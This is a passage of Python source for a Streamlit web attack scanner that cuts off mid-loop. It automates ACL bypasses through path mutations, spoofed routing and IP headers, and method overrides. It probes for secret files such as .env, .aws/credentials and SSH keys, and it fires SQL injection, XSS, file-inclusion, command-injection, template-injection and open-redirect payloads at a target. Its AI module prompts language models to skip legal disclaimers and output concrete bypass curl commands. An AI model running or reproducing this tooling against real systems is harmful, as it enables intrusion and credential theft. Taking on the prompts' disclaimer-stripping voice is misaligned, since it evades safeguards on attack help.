"""
Zwanski Security Scanner v2 — Robots.txt / ACL Bypass Edition
Fixes: missing methods, broken robots parsing, fake bypasses, no concurrency.
Adds: real header/method bypasses, sitemap.xml discovery, threading, better evidence.

Legal: authorized targets only.
"""
from __future__ import annotations

import streamlit as st
import urllib.request
import urllib.parse
import urllib.error
import json
import re
import time
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from typing import Optional

# ─── Page Config ──────────────────────────────────────────────────────────────
st.set_page_config(
    page_title="Zwanski Security Scanner v2",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@700;800&display=swap');
    html, body, [class*="css"] { font-family: 'JetBrains Mono', monospace; }
    h1, h2, h3 { font-family: 'Syne', sans-serif !important; }
    .stApp { background: #0a0e17; color: #c9d1d9; }
    .badge-vuln { background:#ff4b4b22;color:#ff4b4b;border:1px solid #ff4b4b55;padding:2px 10px;border-radius:4px;font-size:.75rem; }
    .badge-safe { background:#00c85322;color:#00c853;border:1px solid #00c85355;padding:2px 10px;border-radius:4px;font-size:.75rem; }
    .badge-bypass { background:#ffa72622;color:#ffa726;border:1px solid #ffa72655;padding:2px 10px;border-radius:4px;font-size:.75rem; }
    .mono-block { background:#111827;color:#00ff9f;padding:10px 14px;border-radius:6px;font-family:monospace;font-size:.82rem;border-left:3px solid #00ff9f44;word-break:break-all; }
    .stButton > button { background:#1a2233;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;transition:all .2s; }
    .stButton > button:hover { border-color:#00ff9f;color:#00ff9f; }
    .stProgress > div > div { background:linear-gradient(90deg,#00ff9f,#2979ff); }
    .metric-card { background:#111827;border:1px solid #1e2a3a;border-radius:8px;padding:16px;text-align:center; }
    .metric-card .value { font-size:2rem;font-weight:800;font-family:'Syne',sans-serif; }
    .metric-card .label { color:#8b949e;font-size:.8rem;margin-top:4px; }
</style>
""", unsafe_allow_html=True)


# ─── urllib-only HTTP ─────────────────────────────────────────────────────────
class Response:
    def __init__(self, status_code: int, text: str, headers: dict, final_url: str = ""):
        self.status_code = status_code
        self.text = text
        self.headers = {k.lower(): v for k, v in headers.items()}
        self.content = text.encode("utf-8", errors="replace")
        self.final_url = final_url


DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"


def http_request(
    url: str,
    method: str = "GET",
    extra_headers: Optional[dict] = None,
    timeout: int = 10,
    allow_redirects: bool = False,
) -> Optional[Response]:
    """Low-level HTTP with header + method control. No external deps."""
    headers = {"User-Agent": DEFAULT_UA}
    if extra_headers:
        headers.update(extra_headers)
    try:
        req = urllib.request.Request(url, headers=headers, method=method)
        opener = urllib.request.build_opener()
        if not allow_redirects:
            # Disable auto-redirect to see raw response
            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a, **kw):
                    return None
            opener = urllib.request.build_opener(NoRedirect)
        with opener.open(req, timeout=timeout) as r:
            text = r.read().decode("utf-8", errors="replace")
            return Response(r.status, text, dict(r.headers), r.url)
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("utf-8", errors="replace")
        except Exception:
            text = ""
        return Response(e.code, text, dict(e.headers) if e.headers else {}, url)
    except Exception:
        return None


# ─── Robots.txt Parser (case-preserving, sitemap-aware) ───────────────────────
class RobotsParser:
    def __init__(self, base_url: str, timeout: int = 10):
        self.base_url = base_url.rstrip("/")
        parsed = urlparse(base_url)
        self.origin = f"{parsed.scheme}://{parsed.netloc}"
        self.robots_url = f"{self.origin}/robots.txt"
        self.sitemap_url = f"{self.origin}/sitemap.xml"
        self.disallowed_paths: list[str] = []
        self.allowed_paths: list[str] = []
        self.sitemaps: list[str] = []
        self.sitemap_urls: list[str] = []
        self.raw_robots = ""
        self.timeout = timeout
        self._fetch_robots()
        self._fetch_sitemaps()

    def _fetch_robots(self):
        resp = http_request(self.robots_url, timeout=self.timeout)
        if not resp or resp.status_code != 200:
            return
        self.raw_robots = resp.text
        self._parse_robots(resp.text)

    def _parse_robots(self, content: str):
        """Case-preserving parser. Only directive names are lowered, not paths."""
        current_agents: list[str] = []
        disallow_by_agent: dict[str, list[str]] = {}
        allow_by_agent: dict[str, list[str]] = {}

        for raw in content.splitlines():
            line = raw.split("#", 1)[0].strip()
            if not line or ":" not in line:
                continue
            key, value = line.split(":", 1)
            key = key.strip().lower()
            value = value.strip()  # preserve case on paths

            if key == "user-agent":
                # New block -- if previous agents had no directives yet, keep them grouped
                current_agents = [value] if not current_agents or value else current_agents
                # Simpler: track last-seen agent
                current_agents = [value]
                disallow_by_agent.setdefault(value, [])
                allow_by_agent.setdefault(value, [])
            elif key == "disallow" and current_agents:
                if value:
                    for a in current_agents:
                        disallow_by_agent.setdefault(a, []).append(value)
            elif key == "allow" and current_agents:
                if value:
                    for a in current_agents:
                        allow_by_agent.setdefault(a, []).append(value)
            elif key == "sitemap":
                self.sitemaps.append(value)

        # Merge: all disallow paths from any agent are potentially interesting for pentest
        all_disallow = []
        for paths in disallow_by_agent.values():
            all_disallow.extend(paths)
        self.disallowed_paths = sorted(set(all_disallow))

        all_allow = []
        for paths in allow_by_agent.values():
            all_allow.extend(paths)
        self.allowed_paths = sorted(set(all_allow))

    def _fetch_sitemaps(self):
        """Pull URLs from declared sitemaps + default /sitemap.xml."""
        targets = list(self.sitemaps) or [self.sitemap_url]
        for sm_url in targets[:5]:  # cap
            resp = http_request(sm_url, timeout=self.timeout)
            if not resp or resp.status_code != 200:
                continue
            try:
                # strip namespace for simpler xpath
                xml_text = re.sub(r'\sxmlns="[^"]+"', "", resp.text, count=1)
                root = ET.fromstring(xml_text)
                for loc in root.iter("loc"):
                    if loc.text:
                        self.sitemap_urls.append(loc.text.strip())
            except ET.ParseError:
                continue
        self.sitemap_urls = sorted(set(self.sitemap_urls))[:200]


# ─── Real Bypass Techniques ───────────────────────────────────────────────────
class BypassEngine:
    """
    Focus on bypasses that actually work against real stacks:
      - Header-based (X-Original-URL, X-Rewrite-URL, X-Forwarded-For)
      - Trailing dot / space / slash
      - Nginx alias / off-by-slash tricks
      - Method override (HEAD, OPTIONS, ACL, PROPFIND)
      - Case manipulation (only on case-insensitive servers like IIS)
      - Unicode normalization (NFKC collapses)
      - Double URL encoding of the slash separator
    """

    @staticmethod
    def path_mutations(path: str) -> list[tuple[str, str]]:
        """Returns list of (technique, mutated_path). path starts with /."""
        p = path if path.startswith("/") else "/" + path
        clean = p.lstrip("/")
        muts = [
            ("trailing_slash", p + "/"),
            ("trailing_dot", p + "."),
            ("trailing_space_encoded", p + "%20"),
            ("trailing_semicolon", p + ";"),
            ("trailing_questionmark", p + "?"),
            ("trailing_hash", p + "#"),
            ("double_slash_prefix", "//" + clean),
            ("dot_slash_prefix", "/./" + clean),
            ("case_upper", "/" + clean.upper()),
            ("case_lower", "/" + clean.lower()),
            ("encoded_slash", "/" + urllib.parse.quote(clean, safe="")),
            ("double_encoded_slash", "/" + urllib.parse.quote(urllib.parse.quote(clean, safe=""), safe="")),
            ("nginx_offbyslash", p.rstrip("/") + "../"),
            ("path_param_injection", p + ";foo=bar"),
            ("utf8_overlong", "/" + clean.replace("/", "%c0%af")),
        ]
        return muts

    @staticmethod
    def header_bypasses(path: str) -> list[tuple[str, dict]]:
        """Headers that some reverse proxies / frameworks honor for internal routing."""
        p = path if path.startswith("/") else "/" + path
        return [
            ("X-Original-URL", {"X-Original-URL": p}),
            ("X-Rewrite-URL", {"X-Rewrite-URL": p}),
            ("X-Override-URL", {"X-Override-URL": p}),
            ("X-Forwarded-For", {"X-Forwarded-For": "127.0.0.1"}),
            ("X-Real-IP", {"X-Real-IP": "127.0.0.1"}),
            ("X-Forwarded-Host", {"X-Forwarded-Host": "localhost"}),
            ("X-Host", {"X-Host": "localhost"}),
            ("Referer_same_origin", {"Referer": "/"}),
            ("Client-IP", {"Client-IP": "127.0.0.1"}),
            ("True-Client-IP", {"True-Client-IP": "127.0.0.1"}),
        ]

    @staticmethod
    def method_bypasses() -> list[str]:
        """HTTP methods sometimes not covered by ACLs (classic on Tomcat, old Apache)."""
        return ["GET", "POST", "HEAD", "OPTIONS", "TRACE", "ACL", "PROPFIND", "PURGE"]


# ─── AI Analyzer (OpenRouter) ─────────────────────────────────────────────────
class AIAnalyzer:
    """
    OpenRouter API wrapper. Uses urllib so it works in restricted envs
    (Streamlit Cloud, Pyodide-via-proxy, etc.) without adding openai/httpx deps.

    OpenRouter endpoint:  https://openrouter.ai/api/v1/chat/completions
    Free models as of 2026 (verify at openrouter.ai/models):
      - deepseek/deepseek-chat-v3:free        (strong reasoning, long context)
      - google/gemini-2.0-flash-exp:free      (fast, good JSON)
      - meta-llama/llama-3.3-70b-instruct:free
      - qwen/qwen-2.5-coder-32b-instruct:free (best for code/exploits)
    Paid but cheap + strong:
      - anthropic/claude-3.5-sonnet
      - openai/gpt-4o-mini
    """

    ENDPOINT = "https://openrouter.ai/api/v1/chat/completions"

    def __init__(self, api_key: str, model: str, timeout: int = 60):
        self.api_key = api_key.strip()
        self.model = model
        self.timeout = timeout

    def _chat(self, system: str, user: str, temperature: float = 0.2,
              max_tokens: int = 2000) -> tuple[bool, str]:
        """Returns (ok, content_or_error)."""
        if not self.api_key:
            return False, "No API key set"
        payload = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user},
            ],
            "temperature": temperature,
            "max_tokens": max_tokens,
        }
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://zwanski.bio",
            "X-Title": "Zwanski Security Scanner",
        }
        try:
            req = urllib.request.Request(
                self.ENDPOINT,
                data=json.dumps(payload).encode("utf-8"),
                headers=headers,
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = json.loads(r.read().decode("utf-8"))
            if "choices" not in body or not body["choices"]:
                return False, f"Unexpected response: {json.dumps(body)[:500]}"
            return True, body["choices"][0]["message"]["content"]
        except urllib.error.HTTPError as e:
            try:
                err_body = e.read().decode("utf-8", errors="replace")
            except Exception:
                err_body = str(e)
            return False, f"HTTP {e.code}: {err_body[:500]}"
        except Exception as e:
            return False, f"Error: {type(e).__name__}: {e}"

    # ── built-in analysis tasks ────────────────────────────────────────────
    def triage(self, scan_report: dict) -> tuple[bool, str]:
        system = (
            "You are a senior bug bounty triager on HackerOne. "
            "Your job: look at raw scan output, rank findings by real-world impact, "
            "flag false positives aggressively, and suggest which findings are worth "
            "writing up. Use CVSS 3.1 reasoning. Be direct, no corporate fluff. "
            "Assume the researcher has authorization. Skip legal disclaimers."
        )
        # Trim the report to avoid context blowup
        trimmed = self._trim_report(scan_report)
        user = (
            "Here is a scan report. Triage it:\n\n"
            f"```json\n{json.dumps(trimmed, indent=2)}\n```\n\n"
            "Output format:\n"
            "## Critical (P1)\n- <finding> — <why it matters> — <suggested next step>\n\n"
            "## High (P2)\n...\n\n"
            "## Likely False Positives\n- <finding> — <why it's noise>\n\n"
            "## Recommended Follow-ups\n- <specific exploitation path to verify>"
        )
        return self._chat(system, user, temperature=0.3, max_tokens=2500)

    def write_h1_report(self, finding: dict, target: str) -> tuple[bool, str]:
        system = (
            "You are a top-ranked HackerOne researcher writing a report. "
            "Match the tone of a professional submission: concise, technical, "
            "impact-focused. Use markdown headers. No filler."
        )
        user = (
            f"Target: {target}\n\n"
            f"Finding data:\n```json\n{json.dumps(finding, indent=2)}\n```\n\n"
            "Write a complete HackerOne report with these sections:\n"
            "# Title\n## Summary\n## Steps to Reproduce\n## Proof of Concept\n"
            "## Impact\n## Remediation\n## References (CWE / OWASP)\n\n"
            "Infer a reasonable title. Use fenced code blocks for requests. "
            "Estimate CVSS 3.1 score with vector string."
        )
        return self._chat(system, user, temperature=0.2, max_tokens=2500)

    def suggest_bypasses(self, path: str, baseline_status: int,
                         failed_techniques: list) -> tuple[bool, str]:
        system = (
            "You are an offensive security expert specializing in WAF, reverse proxy, "
            "and ACL bypass techniques. You know Nginx, Apache, HAProxy, Cloudflare, "
            "Akamai, AWS WAF, IIS, and Tomcat internals. Give concrete payloads only, "
            "no theory. One technique per line, formatted as `curl` commands."
        )
        user = (
            f"Target path: {path}\n"
            f"Baseline response: HTTP {baseline_status}\n"
            f"Techniques already tried and failed:\n"
            + "\n".join(f"- {t}" for t in failed_techniques)
            + "\n\nSuggest 10 advanced bypass techniques NOT in the above list. "
            "Focus on: HTTP/2 smuggling, header injection, parser differentials, "
            "unicode normalization, host header tricks, method overrides. "
            "Output as curl commands against the target."
        )
        return self._chat(system, user, temperature=0.4, max_tokens=2000)

    def classify_response(self, status: int, headers: dict, body_sample: str) -> tuple[bool, str]:
        system = (
            "You are a response fingerprinting expert. Given an HTTP response, "
            "identify: web server, framework, WAF (if any), and whether the "
            "response looks like a real block, a honeypot, or a misconfiguration. "
            "Output JSON only, no prose."
        )
        user = (
            f"Status: {status}\n"
            f"Headers:\n{json.dumps(headers, indent=2)}\n\n"
            f"Body (first 3000 chars):\n{body_sample[:3000]}\n\n"
            'Output JSON: {"server":"","framework":"","waf":"","verdict":"","confidence":0-100,"notes":""}'
        )
        return self._chat(system, user, temperature=0.1, max_tokens=600)

    @staticmethod
    def _trim_report(report: dict) -> dict:
        """Cut down heavy fields to fit in LLM context."""
        trimmed = json.loads(json.dumps(report))  # deep copy
        # Drop the raw robots.txt body
        if "robots_bypass" in trimmed:
            rb = trimmed["robots_bypass"]
            rb.pop("robots_content", None)
            rb.pop("sitemap_urls_sample", None)
            # Keep only successful bypasses per path
            if "bypass_results" in rb:
                rb["bypass_results"] = [
                    {
                        "path": r["path"],
                        "baseline_status": r.get("baseline_status"),
                        "successful_bypasses": r.get("successful_bypasses", []),
                    }
                    for r in rb["bypass_results"]
                    if r.get("successful_bypasses")
                ]
        return trimmed


# ─── Scanner ──────────────────────────────────────────────────────────────────
class SecurityScanner:
    HIDDEN_PATHS = [
        ".env", ".git/config", ".git/HEAD", ".htaccess", "web.config",
        "wp-config.php", "config.php", "config.yml", "settings.py",
        "db.php", "database.php", "backup.sql", "dump.sql", "db.sql",
        "backup.zip", "www.zip", "backup.tar.gz", "site.tar.gz",
        "admin", "admin/login", "administrator", "wp-admin", "panel",
        "phpinfo.php", "info.php", "test.php", "debug.php",
        "error.log", "access.log", "log.txt",
        "api/v1", "api/users", "api/admin", "api/keys", "api/docs",
        "graphql", "swagger", "swagger-ui.html", "openapi.json", "v2/api-docs",
        "actuator", "actuator/env", "actuator/health", "actuator/mappings",
        "metrics", "health", "server-status", "server-info",
        ".aws/credentials", ".ssh/id_rsa", "id_rsa",
        ".DS_Store", ".vscode/settings.json", ".idea/workspace.xml",
        "Dockerfile", "docker-compose.yml", "Jenkinsfile",
    ]

    SENSITIVE_KEYWORDS = [
        "password", "passwd", "secret", "api_key", "apikey", "private_key",
        "aws_access_key", "AKIA", "BEGIN RSA", "BEGIN OPENSSH",
        "mysql_connect", "jdbc:", "mongodb://", "postgres://",
        "<?php", "<%@", "DEBUG = True",
    ]

    def __init__(
        self,
        base_url: str,
        timeout: int = 10,
        rate_limit: float = 0.1,
        workers: int = 10,
    ):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.workers = workers
        self.robots = RobotsParser(base_url, timeout=timeout)
        self.bypass = BypassEngine()

    # ── helpers ────────────────────────────────────────────────────────────
    def _analyze_response(self, resp: Response) -> list[str]:
        evidence = []
        if not resp:
            return evidence
        body_sample = resp.text[:20000].lower()
        body_raw = resp.text[:20000]
        for kw in self.SENSITIVE_KEYWORDS:
            if kw.lower() in body_sample or kw in body_raw:
                evidence.append(f"Sensitive content: `{kw}`")
        if "root:x:" in body_sample or "daemon:" in body_sample:
            evidence.append("LFI indicator (/etc/passwd pattern)")
        for hdr in ("x-powered-by", "x-aspnet-version", "server"):
            if hdr in resp.headers:
                evidence.append(f"Header: {hdr}={resp.headers[hdr]}")
        return evidence

    def _baseline(self, path: str) -> Optional[Response]:
        """Get the baseline forbidden response for a path."""
        url = f"{self.base_url}{path if path.startswith('/') else '/' + path}"
        return http_request(url, timeout=self.timeout)

    def _is_bypass_success(self, baseline: Optional[Response], test: Optional[Response]) -> bool:
        """
        A bypass succeeds when:
          - baseline returns 401/403/404 AND test returns 200/301/302
          - OR response body length differs significantly and test is 2xx
        """
        if not test:
            return False
        if test.status_code in (200, 201, 202, 204):
            if baseline is None or baseline.status_code in (401, 403, 404, 405):
                return True
            # Content size delta > 30%
            if baseline.content and test.content:
                delta = abs(len(test.content) - len(baseline.content))
                if delta / max(len(baseline.content), 1) > 0.3:
                    return True
        return False

    # ── robots bypass ──────────────────────────────────────────────────────
    def _test_single_bypass(self, path: str, baseline: Optional[Response]) -> dict:
        out = {
            "path": path,
            "baseline_status": baseline.status_code if baseline else None,
            "successful_bypasses": [],
            "attempts": 0,
        }
        tasks = []

        # Path mutations
        for technique, mutated in self.bypass.path_mutations(path):
            tasks.append(("path_mutation", technique, mutated, "GET", {}))

        # Header bypasses (point to /, inject target path via header)
        for technique, headers in self.bypass.header_bypasses(path):
            tasks.append(("header_bypass", technique, "/", "GET", headers))

        # Method bypasses
        for method in self.bypass.method_bypasses():
            if method == "GET":
                continue
            tasks.append(("method_bypass", method, path, method, {}))

        out["attempts"] = len(tasks)

        with ThreadPoolExecutor(max_workers=self.workers) as pool:
            futures = {}
            for kind, tech, url_path, method, headers in tasks:
                url = f"{self.base_url}{url_path if url_path.startswith('/') else '/' + url_path}"
                fut = pool.submit(http_request, url, method, headers, self.timeout)
                futures[fut] = (kind, tech, url, method, headers)

            for fut in as_completed(futures):
                kind, tech, url, method, headers = futures[fut]
                resp = fut.result()
                if self._is_bypass_success(baseline, resp):
                    ev = self._analyze_response(resp)
                    out["successful_bypasses"].append({
                        "kind": kind,
                        "technique": tech,
                        "method": method,
                        "url": url,
                        "headers": headers,
                        "status": resp.status_code,
                        "size": len(resp.content),
                        "evidence": ev,
                    })
        return out

    def scan_robots_bypass(self, progress_cb=None) -> dict:
        paths = [p for p in self.robots.disallowed_paths if p and p != "/"]
        results = {
            "robots_url": self.robots.robots_url,
            "robots_content": self.robots.raw_robots,
            "sitemaps": self.robots.sitemaps,
            "sitemap_urls_count": len(self.robots.sitemap_urls),
            "sitemap_urls_sample": self.robots.sitemap_urls[:20],
            "disallowed_paths": paths,
            "total_disallowed": len(paths),
            "bypass_results": [],
            "successful_bypass_count": 0,
            "critical_findings": [],
        }
        if not paths:
            return results

        for i, path in enumerate(paths):
            baseline = self._baseline(path)
            result = self._test_single_bypass(path, baseline)
            results["bypass_results"].append(result)

            for success in result["successful_bypasses"]:
                results["successful_bypass_count"] += 1
                pl = path.lower()
                if any(k in pl for k in ("admin", "config", "backup", "env", ".git", "api", "internal", "private")):
                    results["critical_findings"].append({
                        "path": path,
                        "technique": success["technique"],
                        "kind": success["kind"],
                        "url": success["url"],
                        "status": success["status"],
                        "evidence": success["evidence"],
                    })

            if progress_cb:
                progress_cb((i + 1) / len(paths))
            time.sleep(self.rate_limit)
        return results

    # ── hidden files ───────────────────────────────────────────────────────
    def scan_hidden_files(self, progress_cb=None) -> list:
        total = len(self.HIDDEN_PATHS)
        found = []

        def probe(path):
            url = f"{self.base_url}/{path}"
            resp = http_request(url, timeout=self.timeout)
            if not resp:
                return None
            if resp.status_code in (200, 301, 302, 401, 403):
                return {
                    "path": path,
                    "url": url,
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "evidence": self._analyze_response(resp) if resp.status_code == 200 else [],
                }
            return None

        with ThreadPoolExecutor(max_workers=self.workers) as pool:
            futures = {pool.submit(probe, p): p for p in self.HIDDEN_PATHS}
            for i, fut in enumerate(as_completed(futures)):
                r = fut.result()
                if r:
                    found.append(r)
                if progress_cb:
                    progress_cb((i + 1) / total)
        return found

    # ── parameter injection (restored) ─────────────────────────────────────
    PAYLOADS = {
        "sqli": ["' OR '1'='1", "1' UNION SELECT NULL--", "1 AND 1=1--", "' OR 1=1#"],
        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>"],
        "lfi": ["../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index"],
        "rce": ["; id", "| whoami", "$(id)", "`id`"],
        "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
        "open_redirect": ["//evil.com", "https://evil.com", "/\\evil.com"],
    }
    SQL_ERRORS = ["sql syntax", "mysql error", "ora-", "postgresql error", "sqlite",
                  "microsoft sql", "odbc driver", "unclosed quotation", "syntax error"]

    def scan_parameter_injection(self, param: str, progress_cb=None) -> list:
        """Test injection payloads against ?param=..."""
        findings = []
        all_tests = []
        for category, payloads in self.PAYLOADS.items():
            for p in payloads:
                all_tests.append((category, p))
        total = len(all_tests)

        def probe(category, payload):
            encoded = urllib.parse.quote(payload, safe="")
            url = f"{self.base_url}/?{param}={encoded}"
            resp = http_request(url, timeout=self.timeout)
            if not resp:
                return None
            body = resp.text.lower()
            ev = []
            if category == "sqli":
                for e in self.SQL_ERRORS:
                    if e in body:
                        ev.append(f"SQL error: `{e}`")
            elif category == "xss":
                if payload.lower() in resp.text.lower():
                    ev.append("Payload reflected unencoded")
            elif category == "lfi":
                if "root:x:" in body or "daemon:" in body:
                    ev.append("/etc/passwd contents returned")
            elif category == "ssti":
                if "49" in resp.text:
                    ev.append("Template expression evaluated (7*7=49)")
            elif category == "rce":
                if re.search(r"uid=\d+.*gid=\d+", resp.text):
                    ev.append("Command output returned (uid=/gid=)")
            elif category == "open_redirect":
                loc = resp.headers.get("location", "")
                if "evil.com" in loc:
                    ev.append(f"Redirect to attacker-controlled: {loc}")
            if ev:
                return {
                    "category": category,
                    "payload": payload,
                    "encoded": encoded,
                    "url": url,
                    "status": resp.status_code,
                    "evidence": ev,
                }
            return None

        with ThreadPoolExecutor(max_workers=self.workers) as pool:
            futures = {pool.submit(probe, c, p): (c, p) for c, p in all_tests}
            for i, fut in enumerate(as_completed(futures)):
                r = fut.result()
                if r:
                    findings.append(r)
                if progress_cb:
                    progress_cb((i + 1) / total)
        return findings

    # ── endpoint discovery from sitemap + robots ───────────────────────────
    def scan_endpoints(self, progress_cb=None) -> list:
        """Probe URLs discovered via sitemap.xml and robots allow/disallow."""
        candidates = set()
        for p in self.robots.allowed_paths + self.robots.disallowed_paths:
            if p and p != "/":
                candidates.add(f"{self.base_url}{p if p.startswith('/') else '/' + p}")
        for u in self.robots.sitemap_urls:
            candidates.add(u)

        candidates = list(candidates)[:100]
        if not candidates:
            return []
        total = len(candidates)
        results = []

        def probe(url):
            resp = http_request(url, timeout=self.timeout)
            if not resp:
                return None
            if resp.status_code in (200, 301, 302, 401, 403):
                ev = self._analyze_response(resp) if resp.status_code == 200 else []
                return {
                    "endpoint": urlparse(url).path,
                    "url": url,
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "evidence": ev,
                }
            return None

        with ThreadPoolExecutor(max_workers=self.workers) as pool:
            futures = {pool.submit(probe, u): u for u in candidates}
            for i, fut in enumerate(as_completed(futures)):
                r = fut.result()
                if r:
                    results.append(r)
                if progress_cb:
                    progress_cb((i + 1) / total)
        return results


# ─── Session State ────────────────────────────────────────────────────────────
_DEFAULTS = {
    "scan_done": False,
    "robots_results": {},
    "hidden_files": [],
    "injections": [],
    "endpoints": [],
    "ai_triage": "",
    "ai_reports": {},
    "ai_bypass_suggestions": {},
}
for k, v in _DEFAULTS.items():
    if k not in st.session_state:
        st.session_state[k] = v


# ─── Sidebar ──────────────────────────────────────────────────────────────────
st.markdown("## 🛡️ Zwanski Security Scanner v2")
st.markdown(
    "**Real Bypass Edition** — header injection, method override, path confusion, sitemap harvest\n\n"
    "> ⚠️ **Authorized targets only.**"
)
st.divider()

with st.sidebar:
    st.markdown("### ⚙️ Configuration")
    target_url = st.text_input("Target URL", placeholder="https://example.com")

    st.markdown("### 🎯 Modules")
    enable_robots_bypass = st.checkbox("Robots.txt / ACL Bypass", value=True)
    enable_hidden_files = st.checkbox("Hidden Files", value=True)
    enable_injection = st.checkbox("Parameter Injection", value=False)
    enable_endpoints = st.checkbox("Sitemap/Endpoint Probe", value=True)

    test_param = st.text_input("Injection parameter", value="id")
    timeout_val = st.slider("Request timeout (s)", 3, 30, 10)
    workers_val = st.slider("Concurrent workers", 1, 30, 10)
    rate_val = st.slider("Inter-request delay (s)", 0.0, 2.0, 0.1, 0.05)

    st.divider()
    st.markdown("### 🤖 AI Analysis (OpenRouter)")
    ai_enabled = st.checkbox("Enable AI", value=False,
                             help="Triage findings, generate H1 reports, suggest bypasses")

    # Prefer st.secrets if configured, fall back to manual input
    default_key = ""
    try:
        default_key = st.secrets.get("OPENROUTER_API_KEY", "")
    except Exception:
        pass

    ai_api_key = st.text_input(
        "OpenRouter API Key",
        value=default_key,
        type="password",
        disabled=not ai_enabled,
        help="Get one free at openrouter.ai/keys",
    )

    ai_model = st.selectbox(
        "Model",
        options=[
            "deepseek/deepseek-chat-v3:free",
            "google/gemini-2.0-flash-exp:free",
            "meta-llama/llama-3.3-70b-instruct:free",
            "qwen/qwen-2.5-coder-32b-instruct:free",
            "anthropic/claude-3.5-sonnet",
            "anthropic/claude-3-haiku",
            "openai/gpt-4o-mini",
            "openai/gpt-4o",
            "custom",
        ],
        index=0,
        disabled=not ai_enabled,
    )
    if ai_model == "custom":
        ai_model = st.text_input("Custom model string", value="",
                                 placeholder="provider/model-name",
                                 disabled=not ai_enabled)

    st.divider()
    start_btn = st.button("🚀 Run Scan", type="primary", use_container_width=True)
    clear_btn = st.button("🧹 Clear Results", use_container_width=True)

if clear_btn:
    for k, v in _DEFAULTS.items():
        st.session_state[k] = v
    st.rerun()


# ─── Run Scan ─────────────────────────────────────────────────────────────────
if start_btn:
    if not target_url:
        st.error("Enter a target URL first.")
    elif not target_url.startswith(("http://", "https://")):
        st.error("URL must start with http:// or https://")
    else:
        try:
            scanner = SecurityScanner(
                target_url,
                timeout=timeout_val,
                rate_limit=rate_val,
                workers=workers_val,
            )
        except Exception as e:
            st.error(f"Failed to init scanner: {e}")
            st.stop()

        prog = st.progress(0.0)
        msg = st.empty()

        modules = [enable_robots_bypass, enable_hidden_files, enable_injection, enable_endpoints]
        total_modules = max(sum(modules), 1)
        base = 0.0

        if enable_robots_bypass:
            msg.info("🤖 Parsing robots.txt + sitemap, running bypass matrix…")
            st.session_state["robots_results"] = scanner.scan_robots_bypass(
                lambda p: prog.progress(min(base + p / total_modules, 1.0))
            )
            base += 1 / total_modules

        if enable_hidden_files:
            msg.info("📁 Probing hidden files / sensitive paths…")
            st.session_state["hidden_files"] = scanner.scan_hidden_files(
                lambda p: prog.progress(min(base + p / total_modules, 1.0))
            )
            base += 1 / total_modules

        if enable_injection:
            msg.info(f"💉 Injecting payloads into ?{test_param}=…")
            st.session_state["injections"] = scanner.scan_parameter_injection(
                test_param,
                lambda p: prog.progress(min(base + p / total_modules, 1.0)),
            )
            base += 1 / total_modules

        if enable_endpoints:
            msg.info("🔗 Probing sitemap + robots URLs…")
            st.session_state["endpoints"] = scanner.scan_endpoints(
                lambda p: prog.progress(min(base + p / total_modules, 1.0))
            )

        prog.progress(1.0)
        msg.success("✅ Scan complete")
        st.session_state["scan_done"] = True
        time.sleep(0.4)
        prog.empty()
        msg.empty()


# ─── Results ──────────────────────────────────────────────────────────────────
if st.session_state["scan_done"]:
    rr = st.session_state["robots_results"]
    hf = st.session_state["hidden_files"]
    inj = st.session_state["injections"]
    ep = st.session_state["endpoints"]

    disallowed_count = rr.get("total_disallowed", 0)
    bypassed_count = rr.get("successful_bypass_count", 0)
    critical_count = len(rr.get("critical_findings", []))
    hidden_count = len([x for x in hf if x["status"] == 200])

    c1, c2, c3, c4 = st.columns(4)
    for col, val, label, color in [
        (c1, disallowed_count, "Disallowed Paths", "#ff4b4b"),
        (c2, bypassed_count, "Bypass Hits", "#00ff9f"),
        (c3, critical_count, "Critical Findings", "#ffa726"),
        (c4, hidden_count, "Hidden Files (200)", "#2979ff"),
    ]:
        with col:
            st.markdown(
                f'<div class="metric-card">'
                f'<div class="value" style="color:{color}">{val}</div>'
                f'<div class="label">{label}</div></div>',
                unsafe_allow_html=True,
            )
    st.divider()

    # Tabs
    tab_labels = []
    if enable_robots_bypass: tab_labels.append("🤖 Robots Bypass")
    if enable_hidden_files:  tab_labels.append("📁 Hidden Files")
    if enable_injection:     tab_labels.append("💉 Injections")
    if enable_endpoints:     tab_labels.append("🔗 Endpoints")
    if ai_enabled:           tab_labels.append("🧠 AI Analysis")
    tab_labels.append("📄 Report")
    tabs = st.tabs(tab_labels)
    idx = 0

    if enable_robots_bypass:
        with tabs[idx]:
            st.subheader("🤖 Robots.txt / ACL Bypass")
            if rr.get("robots_content"):
                with st.expander("📋 robots.txt"):
                    st.code(rr["robots_content"])
            if rr.get("sitemaps"):
                st.markdown(f"**Sitemaps found:** {len(rr['sitemaps'])}")
                for s in rr["sitemaps"]:
                    st.markdown(f"- `{s}`")
            st.markdown(f"**Sitemap URLs harvested:** {rr.get('sitemap_urls_count', 0)}")

            if rr.get("critical_findings"):
                st.error(f"⚠️ **{len(rr['critical_findings'])} CRITICAL FINDINGS**")
                for f in rr["critical_findings"]:
                    with st.expander(f"🚨 {f['path']} — {f['technique']} ({f['kind']})"):
                        st.markdown(f'<div class="mono-block">{f["url"]}</div>', unsafe_allow_html=True)
                        st.markdown(f"**Status:** {f['status']}")
                        for e in f.get("evidence", []):
                            st.markdown(f"- {e}")

            st.markdown("### All Bypass Attempts")
            for result in rr.get("bypass_results", []):
                path = result["path"]
